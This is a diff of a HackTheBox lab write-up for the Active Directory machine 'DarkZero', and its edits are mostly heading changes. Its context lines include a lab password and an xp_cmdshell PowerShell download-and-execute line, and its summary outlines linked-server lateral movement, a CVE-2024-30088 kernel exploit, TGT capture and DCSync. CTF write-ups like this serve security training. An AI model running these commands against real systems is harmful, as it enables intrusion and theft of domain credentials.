@@ -1,10 +1,12 @@
-# Introduction
+# DarkZero - HackTheBox Writeup
+
+## Introduction
 
 **DarkZero** is a Windows Active Directory machine that requires a multi-stage attack path. It begins with enumerating exposed services to find a Microsoft SQL Server implementation. Leveraging SQL Linked Servers allows for lateral movement to a secondary Domain Controller. Privilege escalation involves exploiting a Kernel race condition (CVE-2024-30088) to gain SYSTEM privileges. Finally, Domain Dominance is achieved by coercing authentication from the primary DC to capture a TGT and performing a DCSync attack.
 
 -----
 
-# Initial Enumeration
+## Initial Enumeration
 
 ## 1\. External Enumeration
 
@@ -112,9 +114,9 @@ bloodhound-ce-python -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.32.2
 
 -----
 
-# Lateral Movement via MSSQL
+## Lateral Movement via MSSQL
 
-## 1\. SQL Enumeration
+## 1. SQL Enumeration
 
 We connect to the MSSQL instance using `john.w`.
 
@@ -187,9 +189,9 @@ SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadStri
 
 -----
 
-# Privilege Escalation (DC02)
+## Privilege Escalation (DC02)
 
-## 1\. Local Enumeration
+## 1. Local Enumeration
 
 Uploading and running `winPEASx64.exe` on DC02 reveals the OS version and potential vulnerabilities.
 
@@ -243,7 +245,7 @@ C:\Users\Administrator\Desktop> more user.txt
   
 -----
 
-# Full Domain Compromise 
+## Full Domain Compromise 
 
 Although we are SYSTEM on DC02, we need to compromise the primary domain (DarkZero). We can achieve this by coercing DC01 to authenticate to DC02 while we monitor for tickets.
 
@@ -315,7 +317,7 @@ ed1676da<REDACTED>
 
 -----
 
-# Conclusions
+## Conclusions
 
   - **MSSQL Misconfiguration**: The presence of Linked Servers allowed lateral movement from a low-privileged user to a secondary server, bypassing network segmentation.
   - **Kernel Vulnerability**: The unpatched Windows Server 2022 on DC02 was vulnerable to **CVE-2024-30088**, allowing immediate escalation to SYSTEM.
